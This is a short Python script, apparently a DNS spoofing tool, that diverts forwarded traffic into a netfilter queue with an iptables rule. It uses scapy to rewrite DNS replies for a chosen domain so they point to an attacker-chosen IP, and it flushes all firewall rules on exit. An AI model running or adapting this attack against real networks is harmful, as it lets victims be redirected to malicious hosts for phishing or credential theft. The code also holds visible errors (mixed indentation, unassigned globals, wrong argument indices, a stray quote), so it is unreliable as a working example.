#!/usr/bin/python
import netfilterqueue
import scapy.all as scapy
import os
import sys

'''DNS Cache Poisoning Attack

Parameters
----------
Website : str
    Domain's website name to be spoofed
IP : str
    IP to be inserted into DNS records

Returns: (-)
---------
'''

QUEUE_NUM = 0
website = ""
ip = ""

def parse_args():
    if len(sys.argv) == 3:
    	# Insert iptables FORWARD rule to redirect packets to netfilter queue
        print("***   Adding Firewall rule   ***")
    	os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        website, ip =  sys.argv[0], sys.argv[1]
    else:
        print("Invalid amount of arguments.\n")
        print("Syntax: python DNSspoofer.py <website> <IP>")
        sys.exit()

def spoof_packet(packet):
	"""
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """

    # Get payload from packet and convert it to a scapy packet
    dns_packet = scapy.IP(packet.get_payload())

    # Check if the packet is a DNS reply and modify it
    if dns_packet.haslayer(scapy.DNSRR):
    	# Check the DNS question name
        qname = dns_packet[scapy.DNSQR].qname
        if website in qname:
            print(" ***  Modifying DNS packet  *** \n")
            dns_packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=ip)
            dns_packet[scapy.DNS].ancount = 1

            # Delete checksums and length of packet, because we have modified it
            # New calculations are done automatically by scapy
            del dns_packet[scapy.IP].len
            del dns_packet[scapy.IP].chksum
            del dns_packet[scapy.UDP].len
            del dns_packet[scapy.UDP].chksum

            packet.set_payload(str(dns_packet))
    packet.accept()

def run_queue():
	parse_args()
	try:
    	queue = netfilterqueue.NetfilterQueue()
    	queue.bind(QUEUE_NUM, spoof_packet)
        print("***   Running queue   ***"")
    	queue.run()
    except KeyboardInterrupt:
        # Remove rule inserted
    	os.system("iptables --flush")

if __name__ == "__main__":
    run_queue()
